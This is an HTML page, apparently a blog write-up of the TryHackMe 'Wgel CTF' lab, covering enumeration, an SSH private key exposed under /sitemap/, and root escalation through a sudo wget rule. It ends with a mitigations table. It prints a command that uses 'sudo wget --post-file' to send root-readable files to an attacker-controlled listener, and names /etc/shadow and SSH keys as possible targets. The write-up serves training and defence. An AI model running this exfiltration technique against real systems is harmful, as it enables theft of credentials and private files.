@@ -1,0 +1,138 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Wgel CTF — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="A username leaked in an HTML comment, an SSH private key sitting in a publicly browsable .ssh directory under /sitemap/, and a sudo wget rule that lets…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/wgel.html">
+<meta property="og:title" content="Wgel CTF — TryHackMe writeup">
+<meta property="og:description" content="A username leaked in an HTML comment, an SSH private key sitting in a publicly browsable .ssh directory under /sitemap/, and a sudo wget rule that lets…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/wgel.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Wgel CTF — TryHackMe writeup","description":"A username leaked in an HTML comment, an SSH private key sitting in a publicly browsable .ssh directory under /sitemap/, and a sudo wget rule that lets…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-11","url":"https://thecyberfarhan.github.io/writeups/wgel.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/wgel.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Wgel CTF</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 11, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>A username leaked in an HTML comment, an SSH private key sitting in a publicly browsable <code>.ssh</code> directory under <code>/sitemap/</code>, and a <code>sudo wget</code> rule that lets Jessie exfiltrate any file as root. Three steps from landing to root flag — no cracking, no exploits, no escalation chain. Just careful enumeration and one GTFOBins entry. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🔑 SSH</span><span class="chip">🌐 wget + Netcat</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Wgel CTF</strong> — named after the typo-laden tool that ends up doing all the privilege escalation work. The box is a masterclass in the compounding effect of small missteps: a developer comment naming a real user, a <code>.ssh</code> directory left browsable inside a web folder, and a <code>sudo</code> rule granting <code>wget</code> to a non-root user without a password. None of these individually feels catastrophic. Together they form a straight line from the homepage to <code>/root/root_flag.txt</code>. Jessie was told to update the website. Jessie did not update the website. We did something worse.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>How SSH key-based authentication works</li><li>What directory listing exposure means in a web context</li><li>What <code>wget --post-file</code> does and why <code>sudo wget</code> is dangerous</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<p class="aside">Full-range sweep with RustScan, Nmap for service and version fingerprinting:</p>
+<pre><code>rustscan -a 10.49.152.239 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.2p2 Ubuntu 4ubuntu2.8</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.18 (Ubuntu)</td></tr></tbody></table>
+<p>Standard two-port setup. Apache 2.4.18 on Ubuntu 16.04 — same vintage as several other boxes in this series. No Nmap script findings worth noting beyond the basics.</p>
+<h3>Homepage Source — Username in a Comment</h3>
+<p>The homepage is an Apache default page with a Bootstrap-based sitemap template underneath. <code>Ctrl+U</code> reveals:</p>
+<pre><code>&lt;!-- Jessie don't forget to udate the webiste --&gt;</code></pre>
+<p>Username: <code>jessie</code>. The typo (<code>udate</code>) suggests this was written in a hurry and never cleaned up — which tracks with the rest of the box's security posture.</p>
+<h3>Web Directory Enumeration — Pass 1</h3>
+<p class="aside">Feroxbuster on the root with the medium wordlist:</p>
+<pre><code>feroxbuster -u http://10.49.152.239/ \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -x php,txt,html</code></pre>
+
+<pre><code># output (relevant hits only)
+301  http://10.49.152.239/sitemap    # ^^^ template site lives here</code></pre>
+<p>The root is just an Apache default page. Everything of interest is under <code>/sitemap/</code>.</p>
+<h3>Web Directory Enumeration — Pass 2</h3>
+<p class="aside">(~6 mins into the box)</p>
+<p class="aside">Feroxbuster on <code>/sitemap/</code> with the dirb common wordlist — faster and sufficient for this depth:</p>
+<pre><code>feroxbuster -u http://10.49.152.239/sitemap/ \
+  -w /usr/share/wordlists/dirb/common.txt \
+  -x php,txt,html</code></pre>
+
+<pre><code># output (relevant hits only)
+301  http://10.49.152.239/sitemap/.ssh          # ^^^ SSH directory — world browsable
+200  http://10.49.152.239/sitemap/.ssh/id_rsa   # ^^^ private key, no passphrase</code></pre>
+<p>A <code>.ssh</code> directory sitting inside a web-served folder with directory listing enabled. The private key downloads cleanly with no passphrase protection.</p>
+<p class="aside">Downloading the key and setting correct permissions:</p>
+<pre><code>wget http://10.49.152.239/sitemap/.ssh/id_rsa
+chmod 600 id_rsa</code></pre>
+
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~10 mins into the box)</p>
+<h3>sudo wget — GTFOBins File Exfiltration</h3>
+<p class="aside">Checking sudo permissions:</p>
+<pre><code>sudo -l</code></pre>
+
+<pre><code>User jessie may run the following commands on CorpOne:
+    (ALL : ALL) ALL
+    (root) NOPASSWD: /usr/bin/wget</code></pre>
+<p>Two entries worth noting: <code>(ALL : ALL) ALL</code> requires jessie's own password — which we don't have. The second entry, <code>(root) NOPASSWD: /usr/bin/wget</code>, requires no password at all.</p>
+<p><strong>Why is <code>sudo wget</code> dangerous?</strong> <code>wget</code> is a file download and upload tool. The <code>--post-file</code> flag sends the contents of any local file as the HTTP POST body to a URL of your choice. When run as root, it can read *any file on the system* — including <code>/root/root_flag.txt</code>, <code>/etc/shadow</code>, SSH keys, anything. The file gets sent to an attacker-controlled listener as raw HTTP request body. It's a complete root-readable file exfiltration primitive dressed up as a download utility.</p>
+<p class="aside">Setting up a Netcat listener on the attacking machine:</p>
+<pre><code>nc -lnvp 1234</code></pre>
+<p class="aside">Sending the root flag as a POST body via <code>sudo wget</code>:</p>
+<pre><code>sudo /usr/bin/wget --post-file=/root/root_flag.txt http://192.168.134.217:1234</code></pre>
+
+<pre><code># Netcat listener output
+POST / HTTP/1.1
+User-Agent: Wget/1.17.1 (linux-gnu)
+Accept: */*
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+
+b1b968b37519ad1daa6408188649263d   # ^^^ root flag in the POST body</code></pre>
+<p>Root flag exfiltrated. No root shell needed — wget's file-read capability as root was sufficient for the challenge goal.</p>
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain:</p>
+<ol><li><strong>HTML comment</strong> on the homepage → username <code>jessie</code></li><li><strong>Feroxbuster on <code>/sitemap/</code></strong> → exposed <code>/.ssh/id_rsa</code> with directory listing</li><li><strong>SSH login</strong> as <code>jessie</code> with the unprotected private key → user flag</li><li><strong><code>sudo wget --post-file</code></strong> → root flag exfiltrated to local Netcat listener</li></ol>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Username in HTML comment</td><td>Low</td><td>Remove all comments containing usernames, internal notes, or infrastructure hints before deploying to production</td></tr><tr><td><code>.ssh/</code> directory inside web root with directory listing enabled</td><td class="sev-critical">Critical</td><td>Never store SSH keys anywhere under the webroot; disable directory listing with <code>Options -Indexes</code> in Apache config</td></tr><tr><td>SSH private key with no passphrase</td><td class="sev-high">High</td><td>Always protect private keys with a strong passphrase; use <code>ssh-keygen -p</code> to add one retrospectively</td></tr><tr><td><code>sudo wget</code> with NOPASSWD</td><td class="sev-critical">Critical</td><td><code>wget</code> can read and exfiltrate any file as root via <code>--post-file</code>; remove it from <code>sudoers</code> entirely — it serves no legitimate administrative purpose there</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b><code>sudo wget</code> is not "just a download tool" — <code>--post-file</code> turns it into a root-powered file exfiltration primitive. Before adding any binary to <code>sudoers</code>, check GTFOBins. If it's listed, granting <code>sudo</code> on it is granting root-level access to whatever that binary can do. In wget's case, that's reading and transmitting any file on the system.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Run the second Feroxbuster pass on <code>/sitemap/</code> immediately after the first pass rather than waiting — the <code>.ssh</code> directory is the only thing that matters on this box and the dirb common wordlist finds it in under 10 seconds. Also skip the broad medium wordlist on the root entirely; the Apache default page signals there's nothing there.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/wgel_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
